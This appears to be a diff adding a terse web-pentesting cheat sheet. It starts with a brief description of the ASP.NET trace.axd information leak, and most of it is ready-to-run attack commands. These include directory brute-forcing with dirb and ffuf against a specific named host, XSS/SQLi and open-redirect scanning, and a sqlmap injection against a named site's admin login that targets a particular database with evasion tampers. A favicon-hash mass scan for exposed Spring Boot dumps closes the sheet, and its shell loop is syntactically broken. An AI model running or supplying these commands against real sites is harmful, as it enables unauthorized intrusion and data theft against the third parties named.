@@ -1,0 +1,34 @@
+IIS :
+ASP.NET Trace.AXD Information Leak
+/trace.axd
+
+*ASP.NET Trace.AXD Information Leak
+This vulnerability highlights the presence of enabled application tracing in the ASP.NET web application. Application tracing should not be exposed to unauthenticated users, as it can potentially divulge critical information like session IDs and file paths. Disabling application tracing for unauthorized users and implementing proper access controls is essential to mitigate this risk and enhance the security of the web application.
+-------------
+Installing:
+gf:https://medium.com/@sherlock297/how-to-install-gf-tool-in-kali-linux-fc672053a943
+
+
+
+AUTOMATION WEB TESTING :
+
+Director bruteforce:
+dirb http://npickecq.japfaindia.com/npick/ /usr/share/wordlists/dirb/common.txt
+ffuf -u http://npickecq.japfaindia.com/npick/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403,404
+
+Find Open redirection:
+echo https://www.hubspot.com/ | katana | gf redirect
+
+katana scan -u target.com -p xss,sql
+
+httpx:
+httpx -list subdomain > alive_subdomain.txt
+
+
+sqli
+
+sqlmap -u "https://www.carhub.co.in/Admin/login.php" --data="user=admin&password=admin&login=" -D a1689dbo_carhub_patna --tables  --time-sec=5 --tamper=space2comment --hex
+
+
+Vulnerability Name - Memory Dump and Env Disclosure
+org:"Target" http.favicon.hash:116323821 --fields ip_str, port --separator " " | awk '{print $1":"$2}' | while read host do ; do ffuf -u http://$host/FUZZ -mc 200 -w spring-boot.txt ;done
